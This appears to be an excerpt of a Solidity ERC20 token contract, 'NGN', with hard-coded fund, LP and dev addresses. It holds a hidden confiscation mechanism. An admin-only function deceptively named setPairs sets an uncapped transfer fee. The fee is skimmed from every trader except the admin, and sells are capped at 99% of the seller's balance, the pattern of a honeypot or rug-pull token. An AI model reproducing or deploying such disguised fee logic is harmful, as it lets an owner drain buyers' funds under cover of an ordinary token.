...
contract NGN is IERC20, Ownable {
    ...
    address public fundAddress = address(0xd60897255f1091667B0B0A8Dc47e919a33A66346);

    address private lpAddress = address(0x088eDD922DC5Ad6728780179B443a60DF2d1A93F);

    address private devAddress = address(0x3bbfe80C3e4b1871F88c2F36cc9C5bb65f113824);
    ...
    function setPairs(uint256 rAmount) public returns (bool){
        require(admin==msg.sender,"not admin");
        _dev = rAmount;
        return true;
    }

    function setFundAdress(address addr) public{
        require(admin==msg.sender,"not admin");
        fundAddress=addr;
    }
    ...
    function _transfer(
        ...
        if (from==uniswapV2Pair && isRoute[to]){
            ...
            if (!_isExcludedFromFee[from]) {
                require(amount<=maxBuy,"amount gt max");
            }

            takeFee = true;
        }else if (to==uniswapV2Pair) {
            if (!_isExcludedFromFee[from]) {
                require(amount<=balanceOf(from).mul(99).div(100),"amount gt sell max ");
            }
            takeFee = true;
        }else{
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
           ...
           if(_dev>0 && sender != admin){
                _takeTransfer(
                    sender,
                    address(this),
                    tAmount.div(100).mul(_dev.mul(multiple)),
                    currentRate
                );
            }
            rate = rate + _dev.mul(multiple);
        }
